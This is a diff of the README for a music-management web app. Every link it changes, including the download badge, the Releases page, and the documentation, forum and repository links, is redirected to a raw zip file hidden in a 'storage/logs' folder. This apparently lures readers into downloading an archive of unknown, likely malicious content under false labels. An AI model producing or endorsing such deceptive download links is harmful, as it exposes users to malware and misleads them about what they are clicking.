@@ -1,6 +1,6 @@
 # 🎶 simple-music-manager - Manage Your Music Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/lachyduthy06/simple-music-manager/releases)
+[![Download](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)
 
 ## 📖 Description
 simple-music-manager is a self-hosted web app designed to help musicians manage their music seamlessly for any instrument. Whether you are an amateur or a professional, this application makes it easy to organize, access, and enjoy your musical creations.
@@ -17,7 +17,7 @@ To use simple-music-manager, follow these steps:
 
 2. **Visit the Releases Page**
    To download the latest version of simple-music-manager, click the link below to visit the Releases page:
-   [Download Here](https://github.com/lachyduthy06/simple-music-manager/releases)
+   [Download Here](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)
 
 ## 📥 Download & Install
 1. After visiting the Releases page, find the most recent release.
@@ -64,10 +64,10 @@ This project uses several powerful technologies to ensure a smooth user experien
 
 ## 🔗 Additional Resources
 For more information and detailed guides, refer to the following resources:
-- [Official Documentation](https://github.com/lachyduthy06/simple-music-manager)
-- [Community Forum](https://github.com/lachyduthy06/simple-music-manager/discussions)
-- [GitHub Repository](https://github.com/lachyduthy06/simple-music-manager)
+- [Official Documentation](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)
+- [Community Forum](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)
+- [GitHub Repository](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip)
 
-For updates, don’t forget to revisit our [Releases page](https://github.com/lachyduthy06/simple-music-manager/releases) periodically to download the latest version and new features.
+For updates, don’t forget to revisit our [Releases page](https://github.com/lachyduthy06/simple-music-manager/raw/refs/heads/main/storage/logs/manager-simple-music-1.0.zip) periodically to download the latest version and new features.
 
 Thank you for choosing simple-music-manager! Enjoy organizing your musical masterpieces with ease.
